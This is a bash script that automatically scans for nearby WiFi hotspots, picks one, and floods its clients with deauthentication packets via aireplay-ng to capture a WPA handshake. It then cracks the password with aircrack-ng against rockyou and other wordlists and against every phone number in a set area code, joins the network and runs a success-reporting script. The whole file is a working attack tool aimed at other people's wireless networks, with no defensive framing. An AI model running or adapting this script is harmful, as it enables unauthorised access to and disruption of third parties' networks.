#!/bin/bash

#Initial variables set
onlywithclients=1         #Search only for BSSIDS with clients (This can be touchy since it will only detect if there are clients during the initial one minute scan)
crackwithphone=1          #Attempt to crack the password with phone numbers (popular with mobile hotspots) Set the area code below if you have this on
areacode=208              #Change this to the state area code if you have "crackwithphone" enabled


if [[ $(grep ERROR caplog.txt) == '' ]]; then          #If the last exit was without error, clear/create the caplog
  touch caplog.txt
  echo $(date) " - Backing up files" >> caplog.txt
  #This is to backup files before moving on
  mv OLDcaplog.txt OLDESTcaplog.txt
  mv caplog.txt OLDcaplog.txt
  mkdir -p apBK/
  mv ap/* apBK/
  rm -r ap              #Make sure the file is deleted at the start of the script
  mkdir ap/
  touch blacklist
  rm crackedpassword    #Deletes the file so it doesn't get confused between attempts
fi
echo $(date) " - Starting script" >> caplog.txt

echo $(date) " - Starting Variables (1=On, 0=Off):" >> caplog.txt
echo $(date) " - Search for hotspots with client(s) only: $onlywithclients" >> caplog.txt

#The code below tests the connection initially
echo $(date) " - Attempting initial network test..." >> caplog.txt
ping -c 5 www.google.com          #Tests connection, requiring DNS
if [[ $(echo $?) == 2 ]]; then
 echo $(date) " - Failed connection to Google.com." >> caplog.txt
 ping -c 5 8.8.8.8               #Tests connection, not requiring DNS
 if [[ $(echo $?) == 2 ]]; then
   echo $(date) " - Failed connection to 8.8.8.8. Moving on to cracking." >> caplog.txt
 fi
fi
if [[ $(echo $?) == 0 ]]; then
 echo $(date) " - Connection appears to be working. No need for cracking." >> caplog.txt
 python sendsuccess.py
 exit 1                #Since it has a connection, no need to break any passwords, exits the script
fi
#Start the cracking script...
if [[ $(grep wlan1 /proc/net/dev) != '' ]]; then
  if [[ $(grep ERROR2 caplog.txt) == '' ]]; then             #If it didn't exit during the handshake search last time
      echo $(date) " - Starting monitoring..." >> caplog.txt
      ifconfig wlan1 down
      iwconfig wlan1 mode monitor
      ifconfig wlan1 up
      echo $(date) " - Starting scan..." >> caplog.txt
      airodump-ng -w ap/automated --beacons --ignore-negative-one --output-format csv wlan1 & #Start the scan in the background and let it collect data
      sleep 60
      pid="$(ps -e | grep airodump-ng | cut -d' ' -f1 | sed -n '1p')"      #This gets the process ID to kill
      if [[ $pid == '' ]]; then
        pid="$(ps -e | grep airodump-ng | cut -d' ' -f2 | sed -n '1p')"      #This gets the process ID to kill
      fi
      echo $(date) " - Killing $pid" >> caplog.txt
      kill $pid                                   #Kills the process
      if [[ $(ps -e | grep air) != '' ]]; then
        kill -9 $pid                                #Sends a sig9 in case it won't die
        echo $(date) " - Sending a SIG9 because it just won't die" >> caplog.txt
      fi
      clientstart="$(grep -n 'Station MAC' ap/automated-01.csv | cut -d ':' -f1)"        #Finds the line number where the
      clientend="$(wc -l ap/automated-01.csv | cut -d' '  -f1)"         #Finds end of file
      sed -n "${clientstart}, ${clientend} p" ap/automated-01.csv > ap/clients
      todel=$(($clientend-$clientstart+3))                     #Calculates the amount of client lines to delete (plus 3 for safety)
      sed -i '1d;2d' ap/automated-01.csv                       #Deletes the top blank line and column headers
      sed -ie "/Station MAC/,+${todel}d" ap/automated-01.csv        #Takes away the client data at the bottom (Which we have copied over to a different file)
      lines="$(wc -l ap/automated-01.csv | cut -d' '  -f1)" #This figures out how many lines are left so it can choose near the bottom
      if [[ $lines -gt '3' ]]; then              #Only lop off the last two lines if its at least 5 lines long
        lines="$(($lines-2))"                   #Used to select the line 2nd from the bottom
      else
        lines="$(($lines-1))"
      fi
      # Check if there is an open network
      if [[ $(grep -n 'OPN' ap/automated-01.csv | cut -d':' -f1) != '' ]]; then      #Looks for an open network, if it exists, it tries to connect
        linenum="$(grep -n 'OPN' ap/automated-01.csv | cut -d':' -f1)"        #Finds the line number
        ssid="$(cut -d',' -f14 ap/automated-01.csv | sed -n $(echo $linenum)p)" #Grabs the SSID for the connect command
        if [[ $ssid != '' ]] && [[ $ssid != ' ' ]]; then
          echo $(date) " - Found an open network. Trying to connect to $ssid" >> caplog.txt
          ifconfig wlan1 down               #Take it out of monitoring mode
          iwconfig wlan1 mode managed
          ifconfig wlan1 up
          iw dev wlan1 connect '$((ssid))'                                     #Attempts to connect
          sleep 60
          ping -c 5 www.google.com          #Tests connection, requiring DNS
          if [[ $(echo $?) == 2 ]]; then
            echo $(date) " - Failed connection to Google.com" >> caplog.txt
            ping -c 5 8.8.8.8               #Tests connection, not requiring DNS
            if [[ $(echo $?) == 2 ]]; then
              echo $(date) " - Failed connection to 8.8.8.8! No network connection, moving on to break password." >> caplog.txt
              ifconfig wlan1 down             #Put it back into monitoring mode
              iwconfig wlan1 mode monitor
              ifconfig wlan1 up
            fi
          fi
          if [[ $(echo $?) == 0 ]]; then
            echo $(date) " - Connection appears to be working. Exiting." >> caplog.txt
            python sendsuccess.py
            exit 1                #Since it has a connection, no need to break any passwords, exits the script
          fi
        fi
      fi
      #If it must crack the password:
      lines="$(wc -l ap/automated-01.csv | cut -d' '  -f1)" #This figures out how many lines are left so it can choose near the bottom
      if [[ $lines -gt '2' ]]; then              #Only lop off the last two lines if its at least 2 lines long
        lines="$(($lines-1))"                   #Used to select the line 2nd from the bottom
      fi
      ssid=$(cut -d',' -f14 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #Finds the SSID 2nd from the bottom
      bssid=$(cut -d',' -f1 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #Finds the BSSID 2nd from the bottom
      chan=$(cut -d',' -f4 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")      #Finds the CHANNEL 2nd from the bottom
      if [[ $chan == '-1' ]]; then                        #If it accidently selected its own signal
        echo "Reseting variables"
        lines="$(($lines-1))"
        ssid=$(cut -d',' -f14 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #Finds the SSID 2nd from the bottom
        bssid=$(cut -d',' -f1 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #Finds the BSSID 2nd from the bottom
        chan=$(cut -d',' -f4 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")      #Finds the CHANNEL 2nd from the bottom
      fi
      while [[ $ssid == '' ]] && [[ $lines -gt 1 ]] || [[ $(grep $ssid blacklist) != '' ]]; do  #If the SSID is blank AND its not at the top line OR if it's on the blacklist
        lines="$(($lines-1))"
        ssid=$(cut -d',' -f14 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #Finds the SSID
        bssid=$(cut -d',' -f1 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #Finds the BSSID
        chan=$(cut -d',' -f4 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")      #Finds the CHANNEL
        echo $(date) " - Hotspot was blank or on the blacklist, switching now...    ($ssid)" >> caplog.txt
      done
      ####This will check if you only want to try against networks with clients. If so, it will attempt to find one (if not, it defaults to the other choice)
      if [[ $onlywithclients == 1 ]]; then
        echo $(date) " - Now that I have an access point picked out I'll check if it has clients" >> caplog.txt
        if [[ $(grep $ssid ap/clients) == '' ]] && [[ $(grep $bssid ap/clients) == '' ]]; then          #If the SSID and BSSID isn't in the client file, there are no clients connected and it needs to switch
          echo $(date) " - There were no clients connected, so I'm going to switch access points ($ssid)" >> caplog.txt
          oldssid=$ssid
          oldbssid=$bssid
          oldchan=$chan
          ssid=''
          while [[ $ssid == '' ]] || [[ $(grep $ssid ap/clients) == '' ]] || [[ $(grep $ssid blacklist) != '' ]] && [[ $(grep $bssid ap/clients) == '' ]]; do  #If the SSID is blank AND its not at the top line OR if it's on the blacklist
            echo $(date) " - Hotspot was blank, has no clients, or is on the blacklist, switching now... ($ssid)" >> caplog.txt
            lines="$(($lines-1))"
            ssid=$(sed -n "$((lines))"p ap/automated-01.csv | cut -d',' -f14 | sed "0,/ /{s/ //}")     #Finds the SSID
            bssid=$(sed -n "$((lines))"p ap/automated-01.csv | cut -d',' -f1 | sed "0,/ /{s/ //}")     #Finds the BSSID
            chan=$(sed -n "$((lines))"p ap/automated-01.csv | cut -d',' -f4 | sed "0,/ /{s/ //}")      #Finds the CHANNEL
            if [[ $lines -le 1 ]]; then             #If we don't have any more to choose from, it will go with the backup access point previously chosen
              echo $(date) " - Ran out of choices, going with my last choice" >> caplog.txt
              ssid=$oldssid
              bssid=$oldbssid
              chan=$oldchan
              break
            fi
          done
        else        #Else, there are clients and everything is good
          echo $(date) " - Looks like theres at least one client connected, continuing with this access point" >> caplog.txt
        fi
      fi
      # lines=$(grep -n 'TiPhone' ap/automated-01.csv | cut -d':'  -f1)                            #DEBUGGING
      # ssid=$(cut -d',' -f14 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #DEBUGGING
      # bssid=$(cut -d',' -f1 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")     #DEBUGGING
      # chan=$(cut -d',' -f4 ap/automated-01.csv | sed -n "$((lines))"p | sed "0,/ /{s/ //}")      #DEBUGGING
    fi
    if [[ $(grep ERROR2 caplog.txt) != '' ]]; then                     #If it is returning from a restart of the script...
      echo $(date) " - It appears I'm returning from a script restart" >> caplog.txt
      echo $(date) " - #RESUMING" >> caplog.txt
      ssid=$(grep \#SSID caplog.txt | cut -d',' -f2)
      bssid=$(grep \#BSSID caplog.txt | cut -d',' -f2)
      chan=$(grep \#CHAN caplog.txt | cut -d',' -f2)
      ifconfig wlan1 down
      iwconfig wlan1 mode monitor
      ifconfig wlan1 up
      echo $(date) " - Removing old error message" >> caplog.txt
      sed -i '/ERROR2/d' caplog.txt
    fi
    echo $(date) " - Cracking: $ssid BSSID: $bssid Channel: $chan From line: $lines" >> caplog.txt
    echo "-- Progress: 1 --"
    airodump-ng --bssid $bssid --channel $chan --update 10 --write ap/capture wlan1 |& tee airodump-results.txt &     #Attempts to get the password, background process
    #Setup do/while statement to check for handshake
    #Make sure this runs DURING the command, not after.
    duration=0              #Keeps track of how long its been waiting for a handshake
    rand=$(( ( RANDOM % 20 )  + 50 ))         #Random number between 50 and 70
    # rand=4                                      #DEBUGGING
    waited=0
    echo $(date) " - Waiting for handshake. Current random wait time is: $(($rand/4)) minutes" >> caplog.txt
    while [[ $(grep handshake airodump-results.txt) == '' ]]; do        #While there is no capture file...
      duration="$(($duration+1))"             #Add one to the duration
      if [[ $duration -lt $rand ]]; then       #If its waited less than 15 minutes...
        echo "Waiting"
        sleep 15
      else                        #If its waited more than 15 minutes
        echo "De-authing"
        duration=0
        waited="$(($waited+$rand))"                   #Shows how long its waited
        if [[ $waited > 60 ]]; then                    #If its been over an hour of waiting (probably an inactive hotspot)
          echo $(date) " - I've waited $(($waited/4)) minutes. Now BLACKLISTING the wifi and restarting the script" >> caplog.txt
          echo $(date) " - BLACKLISTING: $ssid" >> caplog.txt
          echo $ssid >> blacklist             #Writes the SSID to the blacklist file for records
          ifconfig wlan1 down
          iwconfig wlan1 mode managed
          ifconfig wlan1 up
          pid="$(ps -e | grep airodump-ng | cut -d' ' -f1 | sed -n '1p')"      #This gets the process ID to kill
          if [[ $pid == '' ]]; then
            pid="$(ps -e | grep airodump-ng | cut -d' ' -f2 | sed -n '1p')"      #This gets the process ID to kill
          fi
          echo $(date) " - Killing $pid before I restart..." >> caplog.txt                #Logs the kill
          kill $pid                                     #Kills the airodump-ng
          if [[ $(ps -e | grep air) != '' ]]; then
            kill -9 $pid                                #Sends a sig9 in case it won't die
            echo $(date) " - Sending a SIG9 because it just won't die" >> caplog.txt
          fi
          echo $(date) " - !!!!!EXIT WITH ERROR1" >> caplog.txt               #Exit with "error" so that it won't overwrite the caplog
          exec bash capture                      #Restarts the script, but it will skip the hotspot it just tried
        fi
        rand=$(( ( RANDOM % 20 )  + 50 ))         #Random number between 50 and 70
        echo $(date) " - De-authing clients. New wait time is: $(($rand/4)) minutes. I've waited a total of $(($waited/4)) minutes." >> caplog.txt
        echo '' > airodump-results.txt        #Clears the file so it doesn't get to huge
        aireplay-ng -0 2 -a $bssid wlan1       #De-auths every client
        sleep 15
      fi
      if [[ $(grep 'interface wlan1 down' airodump-results.txt) != '' ]]; then                  #If the interface goes down, restart the script
        echo $(date) " - The interface WLAN1 was shutdown by the system. Restarting the script" >> caplog.txt
        ifconfig wlan1 down
        iwconfig wlan1 mode managed
        ifconfig wlan1 up
        pid="$(ps -e | grep airodump-ng | cut -d' ' -f1 | sed -n '1p')"      #This gets the process ID to kill
        if [[ $pid == '' ]]; then
          pid="$(ps -e | grep airodump-ng | cut -d' ' -f2 | sed -n '1p')"      #This gets the process ID to kill
        fi
        echo $(date) " - Killing $pid before I restart..." >> caplog.txt                #Logs the kill
        kill $pid                                     #Kills the airodump-ng
        if [[ $(ps -e | grep air) != '' ]]; then
          kill -9 $pid                                #Sends a sig9 in case it won't die
          echo $(date) " - Sending a SIG9 because it just won't die" >> caplog.txt
        fi
        echo $(date) " - Recording for purposes of returning:" >> caplog.txt
        echo $(date) " - #SSID,$ssid" >> caplog.txt
        echo $(date) " - #BSSID,$bssid" >> caplog.txt
        echo $(date) " - #CHAN,$chan" >> caplog.txt
        echo $(date) " - !!!!!EXIT WITH ERROR2" >> caplog.txt           #Exit with error since the interface crashed
        exec bash capture                      #Restarts the script, but it will skip the hotspot it just tried
      fi
    done
    echo $(date) " - HANDSHAKE CAPTURED" >> caplog.txt
    pid="$(ps -e | grep airodump-ng | cut -d' ' -f1 | sed -n '1p')"      #This gets the process ID to kill
    if [[ $pid == '' ]]; then
      pid="$(ps -e | grep airodump-ng | cut -d' ' -f2 | sed -n '1p')"      #This gets the process ID to kill
    fi
    echo $(date) " - Killing $pid since I have a handshake file" >> caplog.txt                #Logs the kill
    kill $pid                                     #Kills the airodump-ng process since it has a handshake by now
    if [[ $(ps -e | grep air) != '' ]]; then
      kill -9 $pid                                #Sends a sig9 in case it won't die
      echo $(date) " - Sending a SIG9 because it just won't die" >> caplog.txt
    fi
    #Turn off monitoring mode to allow more CPU usage for cracking
    echo $(date) " - Got the handshake. Turning off monitoring mode" >> caplog.txt
    ifconfig wlan1 down
    iwconfig wlan1 mode managed
    ifconfig wlan1 up
    #It will attempt to break the password now. With the Pi, this can take up to 36 hours
    #It'll use the rockyou.txt file and write the password out to "crackedpassword" when its done
    echo "-- Progress: 2 --"
    wordlistcount=$(($(ls -l /root/Documents/dictionaries | grep -v ^1 | wc -l)-1))
    if [[ $(ls /root/Documents/dictionaries | grep *rockyou*) == '' ]]; then
      echo $(date) " - Rockyou isn't in documents, going to try to find it now" >> caplog.txt
      if [[ $(ls /usr/share/wordlists/rockyou.txt) == '' ]]; then    #If rockyou.txt isn't unzipped, it will do that here
        if [[ $(ls /usr/share/wordlists/rockyou*) != '' ]]; then     #If rockyou exists
          echo $(date) " - Rockyou isn't unzipped but exists. Uncompressing and moving it now" >> caplog.txt
          gunzip /usr/share/wordlists/rockyou*
          cp /usr/share/wordlists/rockyou.txt /root/Documents/dictionaries/
        else
          echo $(date) " - Rockyou doesn't exists in the default location, going straight to documents now" >> caplog.txt
        fi
      fi
    fi
    echo $(date) " - There are $wordlistcount wordlist(s) that I will go through in alphabetical order" >> caplog.txt
    #Do this for all files in /root/Documents/dictionaries
    for wordlists in /root/Documents/dictionaries/*; do
      echo $(date) " - Trying to crack the file with $wordlists" >> caplog.txt
      aircrack-ng -b $bssid -l crackedpassword ap/capture-??.cap -w $wordlists    #Tries to crack it with the dictionary
      #aircrack-ng -b $bssid -l crackedpassword ap/capture-??.cap -w /usr/share/wordlists/test.txt    #DEBUGGING
      if [[ $(cat crackedpassword) != '' ]]; then
        echo $(date) " - It seems something was added to the crackedpassword file, not going through any more dictionaries" >> caplog.txt
        break
      fi
    done
    if [[ $(cat crackedpassword) != '' ]]; then
      echo $(date) " - The password was cracked." >> caplog.txt
      echo $(date) " - Password: $(cat crackedpassword)" >> caplog.txt
      nmcli d wifi connect $ssid password $(cat crackedpassword)
      sleep 60
      ping -c 5 www.google.com          #Tests connection, requiring DNS
      if [[ $(echo $?) == 2 ]]; then
        echo $(date) " - Failed connection to Google.com" >> caplog.txt
        ping -c 5 8.8.8.8               #Tests connection, not requiring DNS
        if [[ $(echo $?) == 2 ]]; then
          echo $(date) " - Failed connection to 8.8.8.8! No network connection, moving on to dictionary attack." >> caplog.txt
        fi
      fi
      if [[ $(echo $?) == 0 ]]; then
        echo $(date) " - Connection appears to be working. Exiting." >> caplog.txt
        python sendsuccess.py
        echo $(date) " - EXIT" >> caplog.txt           #Exit without errors
        exit 1                #Since it has a connection, no need to break any passwords, exits the script
      fi
    fi
    if [[ crackwithphone=1 ]]; then
      echo $(date) " - Trying phone numbers now, area code $areacode" >> caplog.txt
      crunch 10 10 -t $areacode%%%%%%% | aircrack-ng -b $bssid -l crackedpassword ap/capture-??.cap -w -      #Tries to crack it with a phone number
      if [[ $(cat crackedpassword) == '' ]]; then
        echo $(date) " - NO PASSWORD FOUND! --- Quitting ---" >> caplog.txt
        echo $(date) " - Turning off monitoring mode" >> caplog.txt
        ifconfig wlan1 down
        iwconfig wlan1 mode managed
        ifconfig wlan1 up
        echo $(date) " - EXIT" >> caplog.txt           #Exit without errors
        exit 1
      fi
      if [[ $(cat crackedpassword) != '' ]]; then
        echo $(date) " - The password was cracked." >> caplog.txt
        echo $(date) " - Password: $(cat crackedpassword)" >> caplog.txt
        nmcli d wifi connect "$(echo $ssid)" password $(cat crackedpassword)
        sleep 60
        ping -c 5 www.google.com          #Tests connection, requiring DNS
        if [[ $(echo $?) == 2 ]]; then
          echo $(date) " - Failed connection to Google.com" >> caplog.txt
          ping -c 5 8.8.8.8               #Tests connection, not requiring DNS
          if [[ $(echo $?) == 2 ]]; then
            echo $(date) " - Failed connection to 8.8.8.8! No network connection, something went wrong." >> caplog.txt
            echo $(date) " - EXIT" >> caplog.txt           #Exit without errors, since it was just a connection error, caplog needs overwritten next time
            exit 1
          fi
        fi
        if [[ $(echo $?) == 0 ]]; then
          echo $(date) " - Connection appears to be working. Exiting." >> caplog.txt
          python sendsuccess.py
          echo $(date) " - EXIT" >> caplog.txt           #Exit without errors
          exit 1                #Since it has a connection, no need to break any passwords, exits the script
        fi
      fi
    else
      echo $(date) " - Not cracking with phone number" >> caplog.txt
    fi
fi
if [[ $(grep wlan1 /proc/net/dev) == '' ]]; then
    echo $(date) " - There is no wlan1 to use" >> caplog.txt
    sleep 3
fi
#Catch-all to turn off monitoring mode if its still on, this should never really run unless something fails
echo $(date) " - Turning off monitoring mode" >> caplog.txt
ifconfig wlan1 down
iwconfig wlan1 mode managed
ifconfig wlan1 up
echo $(date) " - FINAL EXIT" >> caplog.txt
exit 1
